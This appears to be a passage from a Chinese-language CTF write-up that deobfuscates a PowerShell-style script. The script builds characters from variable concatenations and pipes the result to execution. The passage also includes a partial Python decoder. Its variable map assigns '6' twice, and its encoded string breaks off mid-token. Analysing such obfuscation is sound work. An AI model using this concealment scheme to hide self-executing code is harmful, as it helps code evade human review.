l$d+$g$b$b$q+$g$e$q+$g$e$z+$g$b$b$d+$g$b$u$o+$g$b$u$d+$g$b$b$u+$g$e$b+$g$b$q$d+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$b$u$q+$g$e$u+$g$o$l+$g$e$z+$g$x$d+$g$d$q+$g$d$e+$g$e$b+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$e$i+$g$o$i+$g$b$b$q+$g$b$u$b+$g$z$o+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$x+$g$i$o+$g$b$u$b+$g$b$q$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$d$i+$g$o$b+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$x+$g$e$x+$g$b$b$b+$g$l$l+$g$l$e+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$u+$g$b$b$b+$g$b$u$d+$g$b$b$u+$g$b$b$x+$g$o$u+$g$d$o+$g$d$q+$g$o$o+$g$z$q+$g$d$x+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$x+$g$x$d+$g$b$b$e+$g$b$b$x+$g$b$b$b+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$o+$g$b$b$o+$g$b$b$e+$g$b$u$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$b+$g$x$e+$g$b$b$b+$g$b$u$i+$g$b$b$b+$g$b$b$o+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$i$e+$g$b$u$o+$g$b$u$d+$g$b$b$x+$g$b$u$b+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$o$u+$g$z$o+$g$x$e+$g$b$b$b+$g$b$b$u+$g$b$b$d+$g$b$b$b+$g$b$u$i+$g$l$e+$g$b$b$d+$g$z$o+$g$o$o+$g$z$q+$g$d$o+$g$d$q+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$x+$g$i$o+$g$b$u$b+$g$b$q$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$z$x$i$q$d+$g$z$e$z$q$o+$g$q$e$i$u$l+$g$q$x$z$e$e+$g$z$q+$g$b$u$q+$g$b$u$i+$g$l$e+$g$b$u$z+$g$x$d$z$u$e+$g$z$x$i$q$d+$g$q$u$u$b$u+$g$z$b$z$i$z+$g$q$b$o$e$d+$g$q$x$b$d$l+$g$q$o$d$l$u+$g$q$u$u$o$u+$g$q$u$l$i$x+$g$q$l$x$b$x+$g$z$u$z$o$u+$g$q$b$x$u$q+$g$x$d$q$l$q+$g$b$u$q+$g$b$u$i+$g$l$e+$g$b$u$z+$g$z$q+$g$q$z$x$u$b+$g$q$q$z$b$q+$g$z$e$u$q$e+$g$z$e$z$q$o+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$x+$g$e$x+$g$b$b$b+$g$l$l+$g$l$e+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$u+$g$b$b$b+$g$b$u$d+$g$b$b$u+$g$b$b$x+$g$o$u+$g$d$o+$g$d$q+$g$o$o+$g$z$q+$g$d$u+$g$d$q+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$x+$g$x$d+$g$b$b$e+$g$b$b$x+$g$b$b$b+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$o+$g$b$b$o+$g$b$b$e+$g$b$u$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$b+$g$x$e+$g$b$b$b+$g$b$u$i+$g$b$b$b+$g$b$b$o+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$i$e+$g$b$u$o+$g$b$u$d+$g$b$b$x+$g$b$u$b+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$o$u+$g$z$o+$g$q$o$o$l$o+$g$z$x$e$b$l+$g$z$i$d$l$e+$g$o$u$x$d$e+$g$z$o+$g$o$o+$g$z$q+$g$o$l+$g$d$o+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$x+$g$i$o+$g$b$u$b+$g$b$q$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$q$u$z$q$u+$g$z$u$z$o$u+$g$z$u$u$u$d+$g$z$z$u$o$b+$g$q$z$d$d$i+$g$q$q$z$b$q+$g$z$q+$g$o$l+$g$o$i+$g$z$q+$g$q$u$l$l$i+$g$z$i$u$o$e+$g$q$b$d$b$i+$g$q$u$i$d$b+$g$q$x$o$q$x+$g$x$d$q$l$q+$g$z$d$i$z$b+$g$q$u$o$o$d+$g$q$z$z$i$o+$g$q$u$z$q$u+$g$z$u$z$o$u+$g$q$o$u$z$e+$g$q$u$z$b$x+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$x+$g$e$x+$g$b$b$b+$g$l$l+$g$l$e+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$u+$g$b$b$b+$g$b$u$d+$g$b$b$u+$g$b$b$x+$g$o$u+$g$d$o+$g$d$q+$g$o$o+$g$z$q+$g$d$b+$g$o$i+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$x+$g$x$d+$g$b$b$e+$g$b$b$x+$g$b$b$b+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$o+$g$b$b$o+$g$b$b$e+$g$b$u$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$b+$g$x$e+$g$b$b$b+$g$b$u$i+$g$b$b$b+$g$b$b$o+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$i$e+$g$b$u$o+$g$b$u$d+$g$b$b$x+$g$b$u$b+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$o$u+$g$z$o+$g$q$o$o$l$o+$g$z$x$e$b$l+$g$z$i$d$l$e+$g$o$u$x$d$e+$g$z$o+$g$o$o+$g$z$q+$g$o$l+$g$d$o+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$x$e+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$b$b$o+$g$b$b$b+$g$b$u$i+$g$b$b$d+$g$o$x+$g$x$d+$g$b$u$u+$g$b$u$u+$g$i$q+$g$l$e+$g$b$b$u+$g$b$u$z+$g$b$u$b+$g$o$u+$g$x$o+$g$o$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$o+$g$z$q+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$o+$g$z$q+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$b+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$x$d+$g$b$u$u+$g$b$u$u+$g$l$d+$g$i$z+$g$b$u$o+$g$b$b$b+$g$b$b$l+$g$b$b$u+$g$o$u+$g$b$q$z+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$x$d+$g$l$l+$g$b$b$x+$g$b$u$d+$g$b$b$i+$g$l$e+$g$b$b$x+$g$b$u$b+$g$o$u+$g$o$b+$g$b$q$d+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$x$d+$g$b$u$u+$g$b$u$u+$g$l$d+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$x$e+$g$b$u$i+$g$b$b$b+$g$b$b$d+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$u+$g$b$q$z+$g$b$z+$g$b$u+$g$z$q+$g$z$q+$g$z$q+$g$z$q+$g$z$x+$g$l$d+$g$o$x+$g$x$e+$g$l$e+$g$b$b$u+$g$l$l+$g$b$u$b+$g$b$u$i+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$o+$g$b$b$o+$g$b$b$e+$g$b$u$b+$g$b$z+$g$b$u+$g$z$q+$g$z$q+$g$z$q+$g$z$q+$g$l$b+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$e+$g$b$u$b+$g$b$b$d+$g$b$b$d+$g$l$e+$g$b$u$z+$g$b$u$b+$g$x$x+$g$b$b$b+$g$b$q$u+$g$l$z+$g$d$i+$g$d$i+$g$i$z+$g$b$u$o+$g$b$b$b+$g$b$b$l+$g$o$u+$g$z$o+$g$b$l$l$i$b+$g$q$u$i$u$b+$g$z$d$e$x$i+$g$q$u$i$d$b+$g$z$i$z$i$b+$g$x$d$q$i$b+$g$z$o+$g$o$o+$g$z$q+$g$z$o+$g$q$d$d$d$q+$g$z$b$u$z$o+$g$z$o+$g$o$o+$g$z$q+$g$l$b+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$e+$g$b$u$b+$g$b$b$d+$g$b$b$d+$g$l$e+$g$b$u$z+$g$b$u$b+$g$x$x+$g$b$b$b+$g$b$q$u+$g$x$x+$g$b$b$e+$g$b$b$x+$g$b$b$x+$g$b$b$b+$g$b$b$u+$g$b$b$d+$g$l$z+$g$d$i+$g$d$i+$g$e$l+$g$e$d+$g$o$o+$g$z$q+$g$l$b+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$e+$g$b$u$b+$g$b$b$d+$g$b$b$d+$g$l$e+$g$b$u$z+$g$b$u$b+$g$x$x+$g$b$b$b+$g$b$q$u+$g$e$z+$g$l$l+$g$b$b$b+$g$b$b$u+$g$l$z+$g$d$i+$g$d$i+$g$e$z+$g$b$b$u+$g$b$u$q+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$l$e+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$o$b+$g$b$z+$g$b$u+$g$b$q$d+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$i$z+$g$b$u$o+$g$b$b$b+$g$b$b$l+$g$x$i+$g$b$u$d+$g$l$e+$g$b$u$i+$g$b$b$b+$g$b$u$z+$g$o$u+$g$o$b+$g$z$q+$g$b$q$o+$g$z$q+$g$e$l+$g$b$b$e+$g$b$b$x+$g$o$d+$g$e$i+$g$b$b$e+$g$b$u$i+$g$b$u$i)  "  |  .$r 
```

通过累加来进行赋值，搓一个python还原脚本

```python
# 定义变量映射
var_map = {
    'b': '1', 'u': '0', 'q': '2', 'z': '3',
    'o': '4', 'd': '5', 'h': '6', 'e': '7',
    'i': '8', 'l': '9', 'x': '6'
}

# 从原始脚本中提取的编码字符串（简化版）
encoded_str = (
    "$g$z$x+$g$x$i+$g$b$u$b+$g$l$i+$g$b$b$e+$g$b$u$z+$g$i$u+$g$b$b$o+$g$b$u$b+$g$b$u$q+$g$b$u$b+$g$b$b$o+$g$b$u$b+$g$b$b$u+$g$l$l+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$x$l+$g$b$b$o+$g$b$b$o+$g$b$b$b+$g$b$b$o+$g$x$d+$g$l$l+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$i$u+$g$b$b$o+$g$b$u$b+$g$b$u$q+$g$b$u$b+$g$b$b$o+$g$b$u$b+$g$b$b$u+$g$l$l+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$x+$g$b$u$b+$g$b$b$o+$g$l$i+$g$b$b$b+$g$b$b$d+$g$b$u$b+$g$i$u+$g$b$b$o+$g$b$u$b+$g$b$u$q+$g$b$u$b+$g$b$b$o+$g$b$u$b+$g$b$b$u+$g$l$l+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$e+$g$l$e+$g$b$b$o+$g$b$b$u+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$i$u+$g$b$b$o+$g$b$u$b+$g$b$u$q+$g$b$u$b+$g$b$b$o+$g$b$u$b+$g$b$b$u+$g$l$l+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$i$z+$g$b$u$d+$g$b$u$i+$g$b$u$b+$g$b$b$u+$g$b$b$x+$g$b$u$i+$g$b$q$b+$g$x$e+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$b$u$d+$g$b$b$u+$g$b$b$e+$g$b$u$b+$g$z$o+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$l$b+$g$b$b$i+$g$b$b$b+$g$b$u$d+$g$b$u$u+$g$l$z+$g$z$q+$g$l$b+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$q+$g$b$u$b+$g$b$u$q+$g$b$u$i+$g$b$u$b+$g$l$l+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$o$x+$g$x$d+$g$b$b$d+$g$b$b$d+$g$b$u$b+$g$b$u$l+$g$l$i+$g$b$u$i+$g$b$q$b+$g$l$z+$g$d$i+$g$d$i+$g$e$x+$g$b$b$b+$g$l$e+$g$b$u$u+$g$i$e+$g$b$u$d+$g$b$b$x+$g$b$u$o+$g$i$u+$g$l$e+$g$b$b$o+$g$b$b$x+$g$b$u$d+$g$l$e+$g$b$u$i+$g$e$i+$g$l$e+$g$b$u$l+$g$b$u$b+$g$o$u+$g$z$o+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$z$o+$g$o$b+$g$b$z+$g$b$u+$g$l$b+$g$b$b$i+$g$b$b$b+$g$b$u$d+$g$b$u$u+$g$l$z+$g$z$q+$g$l$b+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$q+$g$b$u$b+$g$b$u$q+$g$b$u$i+$g$b$u$b+$g$l$l+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$o$x+$g$x$d+$g$b$b$d+$g$b$b$d+$g$b$u$b+$g$b$u$l+$g$l$i+$g$b$u$i+$g$b$q$b+$g$l$z+$g$d$i+$g$d$i+$g$e$x+$g$b$b$b+$g$l$e+$g$b$u$u+$g$i$e+$g$b$u$d+$g$b$b$x+$g$b$u$o+$g$i$u+$g$l$e+$g$b$b$o+$g$b$b$x+$g$b$u$d+$g$l$e+$g$b$u$i+$g$e$i+$g$l$e+$g$b$u$l+$g$b$u$b+$g$o$u+$g$z$o+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$z$o+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$b$b$d+$g$b$u$o+$g$b$b$e+$g$b$b$x+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$u+$g$z$q+$g$o$e+$g$b$b$d+$g$z$q+$g$o$e+$g$b$b$x+$g$z$q+$g$d$o+$g$o$i+$g$o$i+$g$z$q+$g$x$q+$g$z$x+$g$e$i+$g$b$b$e+$g$b$u$i+$g$b$u$i+$g$z$q+$g$d$u+$g$x$q+$g$z$i+$g$o$l+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$i$o+$g$b$u$b+$g$b$q$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$x$e+$g$b$u$d+$g$l$e+$g$b$u$i+$g$b$u$i+$g$b$b$b+$g$x$d$z$e$o+$g$o$u+$g$i$e$z$x+$g$b$i$z+$g$l$x$l+$g$x$u+$g$z$q+$g$o$b+$g$i$l$e$i+$g$l$e$z$z+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$i$z+$g$b$b$x+$g$l$e+$g$b$b$o+$g$b$b$x+$g$i$u+$g$b$b$b+$g$b$b$d+$g$b$u$d+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$e$e+$g$l$e+$g$b$b$u+$g$b$b$e+$g$l$e+$g$b$u$i+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$e$x+$g$b$b$b+$g$l$l+$g$l$e+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$u+$g$b$b$b+$g$b$u$d+$g$b$b$u+$g$b$b$x+$g$o$u+$g$d$q+$g$o$i+$g$o$o+$g$z$q+$g$d$q+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$o$u+$g$d$d+$g$d$u+$g$o$i+$g$o$o+$g$z$q+$g$d$q+$g$d$x+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$e$e+$g$b$u$d+$g$b$b$u+$g$b$u$d+$g$b$u$l+$g$l$e+$g$b$u$i+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$o$u+$g$d$d+$g$d$u+$g$o$i+$g$o$o+$g$z$q+$g$d$q+$g$d$x+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$e$e+$g$l$e+$g$b$q$u+$g$b$u$d+$g$b$u$l+$g$l$e+$g$b$u$i+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$o$u+$g$d$d+$g$d$u+$g$o$i+$g$o$o+$g$z$q+$g$d$q+$g$d$x+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$x$x+$g$b$b$b+$g$b$b$o+$g$b